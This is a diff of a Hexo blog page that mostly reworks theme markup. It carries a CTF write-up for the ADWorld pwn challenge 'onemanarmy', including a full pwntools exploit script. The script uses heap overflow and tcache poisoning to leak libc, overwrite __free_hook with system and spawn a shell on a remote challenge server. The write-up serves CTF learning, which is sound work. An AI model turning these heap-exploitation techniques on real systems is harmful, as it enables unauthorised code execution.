@@ -35,10 +35,10 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
-    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
   </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
@@ -46,13 +46,15 @@
 <body>
 <div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
+    
 
     
 </div>
 
 
-<main class="page-container border-box">
 
+<main class="page-container border-box">
     <!-- home first screen  -->
     
 
@@ -78,49 +80,59 @@
             <div class="pc">
                 <ul class="menu-list">
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/"
                             >
+                                
                                 HOME
                             </a>
                         </li>
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/archives"
                             >
+                                
                                 ARCHIVES
                             </a>
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                CATEGORIES
-                            </a>
-                        </li>
-                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/tags"
                             >
+                                
                                 TAGS
                             </a>
                         </li>
                     
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/about"
                             >
+                                
                                 ABOUT
                             </a>
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="fas search fa-search"></i>
                         </li>
                     
                 </ul>
@@ -139,29 +151,39 @@
     <div class="header-drawer">
         <ul class="drawer-menu-list">
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/"
+                    >HOME</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives"
+                    >ARCHIVES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/tags"
+                    >TAGS</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/categories"
+                    >CATEGORIES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/about">ABOUT</a>
+                       href="/about"
+                    >ABOUT</a>
                 </li>
             
         </ul>
@@ -177,61 +199,57 @@
         <div class="page-main-content-middle border-box">
 
             <div class="main-content border-box">
-
                 
 
-                    <div class="fade-in-down-animation">
+                    
+<div class="fade-in-down-animation">
     <div class="post-page-container border-box">
-
-        <div class="article-content-container border-box">
-
+        <div class="post-content-container border-box">
             
 
-            <div class="article-content-bottom border-box">
+            <div class="post-content-bottom border-box">
                 
-                    <div class="article-title">
+                    <div class="post-title">
                         ADWorld PWN Challenge Area Write-ups (Tcache)
                     </div>
                 
 
                 
-                    <div class="article-header border-box">
+                    <div class="post-header border-box">
                         
                             <div class="avatar-box border-box">
                                 <img src="/img/aliwangwang.svg">
                             </div>
                         
                         <div class="info-box">
-                            <div class="author">
+                            <div class="author border-box">
                                 <span class="name">TyeYeah</span>
                                 
-                                    <span class="author-label">Lv4</span>
+                                    <span class="author-badge">Lv4</span>
                                 
                             </div>
                             <div class="meta-info border-box">
                                 
 
-<div class="article-meta-info-container border-box post">
-    <div class="article-meta-info border-box">
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
         
 
-
         
-            <span class="meta-info-item article-create-date">
-                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2020-10-26 09:11:53</span>
-                <span class="mobile">2020-10-26 09:11</span>
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2020-10-26 09:11:53</span>
             </span>
 
-            <span class="meta-info-item article-update-date">
+            <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc" data-updated="Thu May 06 2021 11:08:26 GMT+0800">2021-05-06 11:08:26</span>
+                <span class="datetime" data-updated="Thu May 06 2021 11:08:26 GMT+0800">2021-05-06 11:08:26</span>
             </span>
         
 
         
-            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="article-category-ul">
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
                     
                             <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
                         
@@ -241,9 +259,8 @@
         
 
         
-            <span class="article-tag meta-info-item border-box">
-                <i class="icon fas fa-tags"></i>&nbsp;
-                <ul class="article-tag-ul">
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
@@ -266,12 +283,12 @@
 
         
         
-            <span class="meta-info-item article-wordcount">
+            <span class="meta-info-item post-wordcount">
                 <i class="icon fas fa-file-word"></i>&nbsp;<span>988 Words</span>
             </span>
         
         
-            <span class="meta-info-item article-min2read">
+            <span class="meta-info-item post-min2read">
                 <i class="icon fas fa-clock"></i>&nbsp;<span>6 Mins</span>
             </span>
         
@@ -286,7 +303,7 @@
                     </div>
                 
 
-                <div class="article-content keep-markdown-body">
+                <div class="post-content keep-markdown-body">
                     
 
                     <h2 id="onemanarmy"><a href="#onemanarmy" class="headerlink" title="onemanarmy"></a>onemanarmy</h2><p>Attachment: <a href="/filehost/apcaw/onemanarmy.zip">onemanarmy.zip</a><br>Description: None</p>
@@ -311,7 +328,6 @@
 <p>Actually the exploit varies from person to person, and the arrangement of memory is a bit difficult, so please check the exploit script for details. </p>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31153&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_func</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_9011</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;9011&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc continuous spaces and put them into tcache list</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>): </span><br><span class="line"><span class="comment"># enough memory space is needed, or the fake large chunk won&#x27;t be put in unsorted bin </span></span><br><span class="line"><span class="comment"># the fake chunk cannot overlap unallocated memory</span></span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x10</span> * (i+<span class="number">1</span>)</span><br><span class="line">    free_func()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;alloced memory size: &#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc chunk 0 and overflow using &#x27;func_9011&#x27;</span></span><br><span class="line">alloc(<span class="number">0x10</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x10</span>*<span class="string">&#x27;1&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x581</span>) </span><br><span class="line"><span class="comment"># the size should be larger than tcache, 24-&gt;1032 bytes on 64-bit and 12-&gt;516 bytes on 32-bit</span></span><br><span class="line"><span class="comment"># and must cover other complete chunks (for example: 0x4b1, 0x660)</span></span><br><span class="line"><span class="comment"># if incompletly overlap other chunk will cause double free check</span></span><br><span class="line">func_9011(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">##########################DEBUG#####################################</span></span><br><span class="line"><span class="comment"># print pidof(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free chunk 1 to unsorted bin</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"><span class="comment"># split fake chunk 1, and pass `unsorted bin` fd to chunk 2</span></span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recv(<span class="number">1</span>) <span class="comment"># byte &#x27;2&#x27;</span></span><br><span class="line">addr = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(addr[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xfffffffffffff000</span>) + (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>) <span class="comment"># calculate malloc hook</span></span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget_addr = libc_base +  <span class="number">0x4f2c5</span> <span class="comment"># or 0x4f322 # or 0x10a38c         </span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;main arena + 0x88: &#x27;</span> + <span class="built_in">hex</span>(main_arena_88)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;malloc hook addr: &#x27;</span> + <span class="built_in">hex</span>(malloc_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free hook addr: &#x27;</span> + <span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one gadget addr: &#x27;</span> + <span class="built_in">hex</span>(one_gadget_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;+++++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook addr to chunk 3&#x27;s fd</span></span><br><span class="line">payload2 = <span class="number">0x30</span>*<span class="string">&#x27;2&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(free_hook_addr)</span><br><span class="line">func_9011(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc __free_hook out</span></span><br><span class="line">alloc(<span class="number">0x40</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># alloc(0x40,p64(one_gadget_addr))  # not working</span></span><br><span class="line">alloc(<span class="number">0x40</span>,p64(system_addr)) <span class="comment"># write system addr to free hook</span></span><br><span class="line">alloc(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_func()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
                 </div>
-
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -350,18 +366,18 @@
                 
 
                 
-                    <div class="article-nav">
+                    <div class="post-nav border-box">
                         
-                            <div class="article-prev">
+                            <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
                                    href="/2020/11/20/2020-11-20-Attack-Defense-Tips/"
                                    title="Attack &amp; Defense Tips"
                                 >
                                     <span class="left arrow-icon flex-center">
-                                      <i class="fas fa-chevron-left"></i>
+                                        <i class="fas fa-chevron-left"></i>
                                     </span>
-                                            <span class="title flex-center">
+                                    <span class="title flex-center">
                                         <span class="post-nav-title-item text-ellipsis">Attack &amp; Defense Tips</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
@@ -369,7 +385,7 @@
                             </div>
                         
                         
-                            <div class="article-next">
+                            <div class="next-post">
                                 <a class="next"
                                    rel="next"
                                    href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-IO-FILE-related/"
@@ -379,8 +395,8 @@
                                         <span class="post-nav-title-item text-ellipsis">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
-                                            <span class="right arrow-icon flex-center">
-                                      <i class="fas fa-chevron-right"></i>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
@@ -416,7 +432,6 @@
 
                 
             </div>
-
         </div>
 
         <div class="page-main-content-bottom border-box">
@@ -472,6 +487,11 @@
 
         <!-- PC go comment -->
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
@@ -490,7 +510,7 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-dark-light-toggle flex-center">
+        <li class="tools-item tool-toggle-theme-mode flex-center">
             <i class="fas fa-moon"></i>
         </li>
 
@@ -587,7 +607,9 @@
 
 <script src="/js/back2top.js"></script>
 
-<script src="/js/dark-light-toggle.js"></script>
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
 
 <script src="/js/main.js"></script>
 
@@ -598,13 +620,6 @@
 
     
 <script src="/js/local-search.js"></script>
-
-
-
-<!-- code-block -->
-
-    
-<script src="/js/code-block.js"></script>
 
 
 
@@ -632,10 +647,16 @@
         
     
 
-    <!-- category-page -->
+    <!-- categories page -->
     
 
-    <!-- links-page -->
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
 
